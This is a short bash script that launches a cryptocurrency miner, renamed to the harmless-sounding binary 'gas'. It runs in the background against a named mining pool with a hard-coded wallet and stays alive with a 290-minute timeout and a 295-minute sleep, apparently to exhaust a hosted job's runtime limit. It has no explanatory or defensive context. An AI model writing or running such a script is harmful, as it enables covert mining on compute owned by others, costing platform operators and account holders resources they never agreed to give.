#!/bin/bash
chmod u+x gas
POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.tai
nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET &
jobs
echo "haha"
apt-get update -y
sleep 295m
